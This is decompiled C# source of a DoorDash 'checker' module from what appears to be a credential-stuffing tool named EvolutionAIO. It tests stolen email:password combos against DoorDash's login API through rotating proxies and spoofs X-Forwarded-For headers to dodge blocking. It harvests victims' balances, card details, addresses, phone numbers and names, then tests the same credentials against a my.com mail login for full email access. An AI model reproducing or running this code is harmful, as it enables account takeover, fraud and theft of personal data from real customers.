// Decompiled with JetBrains decompiler
// Type: EvolutionAIO.Checkers.DoorDash
// Assembly: EvolutionAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FFBD76CC-A7A1-4682-B132-DAECA7C9FD32
// Assembly location: C:\Users\Pc\Downloads\Evolutionv2\EvolutionAIO.exe

using Leaf.xNet;
using System;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;

namespace EvolutionAIO.Checkers
{
  internal class DoorDash
  {
    public static bool check(string[] s, string proxy)
    {
      if (0 >= Config.config.retries + 1)
        return false;
      while (true)
      {
        try
        {
          using (HttpRequest httpRequest = new HttpRequest())
          {
            proxy = Menu.proxies.ElementAt<string>(new Random().Next(Menu.proxiesCount));
            if (Menu.proxyProtocol == "HTTP")
              httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
            if (Menu.proxyProtocol == "SOCKS4")
              httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
            if (Menu.proxyProtocol == "SOCKS5")
              httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
            httpRequest.IgnoreProtocolErrors = true;
            Random random = new Random();
            string str1 = string.Format("{0}.{1}.{2}.{3}", (object) random.Next(1, 256), (object) random.Next(1, 256), (object) random.Next(1, 256), (object) random.Next(1, 256));
            string str2 = "email=" + s[0] + "&password=" + s[1];
            httpRequest.AddHeader("Accept", "*/*");
            httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36");
            httpRequest.AddHeader("Pragma", "no-cache");
            httpRequest.AddHeader("X-Forwarded-For", str1);
            httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
            HttpResponse httpResponse = httpRequest.Post("https://api.doordash.com/v2/auth/web_login/", str2, "application/x-www-form-urlencoded");
            if (httpResponse.ToString().Contains("last_name"))
            {
              string str3 = Menu.Parse(httpResponse.ToString(), "\"account_credits\":", ",\"");
              string str4 = Menu.Parse(httpResponse.ToString(), "exp_month\":\"", "\"");
              string str5 = Menu.Parse(httpResponse.ToString(), "exp_year\":\"", "\"");
              if (str4 == "" || str5 == "" || str3 == "0")
              {
                ++Menu.frees;
                Save.AsResult(nameof (DoorDash), "Frees", s[0] + ":" + s[1] + " | FREE");
                if (Menu.p1 == "2")
                  Colorful.Console.WriteLine(" [/] " + s[0] + ":" + s[1] + " | FREE", Color.Yellow);
                return false;
              }
              int startIndex = str3.Length - 2;
              string str6 = startIndex == 0 ? "0." + str3 : str3.Insert(startIndex, ".");
              string str7 = "N/A";
              string str8 = "N/A";
              string str9 = "N/A";
              string str10 = "N/A";
              string str11 = "N/A";
              string str12 = "N/A";
              string str13 = "";
              try
              {
                str7 = Menu.Parse(httpResponse.ToString(), "last4\":\"", "\"");
                str8 = Menu.Parse(httpResponse.ToString(), "\"type\":\"", "\"");
                str9 = Menu.Parse(httpResponse.ToString(), "printable_address\":\"", "\"");
                str10 = Menu.Parse(httpResponse.ToString(), "phone_number\":\"", "\"");
                str11 = Menu.Parse(httpResponse.ToString(), "first_name\":\"", "\"") + " " + Menu.Parse(httpResponse.ToString(), "last_name\":\"", "\"");
                str12 = Menu.Parse(httpResponse.ToString(), "verified\":", ",");
              }
              catch
              {
                str13 = "Some Capture Couldn't Be Parsed";
              }
              string str14 = !(str12 == "null") ? "True" : "False";
              string str15 = str4 + "\\" + str5;
              httpRequest.ClearAllHeaders();
              httpRequest.AddHeader("User-Agent", "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0");
              if (httpRequest.Post("https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOSÂ¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login=" + s[0] + "&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=fr_FR&Password=" + s[1] + "&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&").ToString().Contains("Ok=1"))
              {
                ++Menu.hits;
                Save.AsResult(nameof (DoorDash), "FA Hits", s[0] + ":" + s[1]);
                Save.AsResult(nameof (DoorDash), "FA Capture", s[0] + ":" + s[1] + " | Balance: $" + str6 + " ~ Card Info: ****" + str7 + " " + str15 + " " + str8 + " ~ Address: " + str9 + " ~ Phone #: " + str10 + " ~ Full Name: " + str11 + " ~ Verified: " + str14 + " " + str13);
                if (Menu.p1 == "2")
                  Colorful.Console.WriteLine(" [+] " + s[0] + ":" + s[1] + " | Balance: $" + str6 + " ~ FA: Yes", Color.Green);
                return false;
              }
              ++Menu.hits;
              Save.AsResult(nameof (DoorDash), "Hits", s[0] + ":" + s[1]);
              Save.AsResult(nameof (DoorDash), "Capture", s[0] + ":" + s[1] + " | Balance: $" + str6 + " ~ Card Info: ****" + str7 + " " + str15 + " " + str8 + " ~ Address: " + str9 + " ~ Phone #: " + str10 + " ~ Full Name: " + str11 + " ~ Verified: " + str14 + " " + str13);
              if (Menu.p1 == "2")
                Colorful.Console.WriteLine(" [+] " + s[0] + ":" + s[1] + " | Balance: $" + str6 + " ~ FA: No", Color.LawnGreen);
              return false;
            }
            if (httpResponse.ToString().Contains("Incorrect username or password"))
              return false;
            ++Menu.retries;
          }
        }
        catch (Exception ex)
        {
          if (ex.ToString().Contains("Index was outside the bounds of the array"))
            return false;
          ++Menu.errors;
        }
      }
    }
  }
}
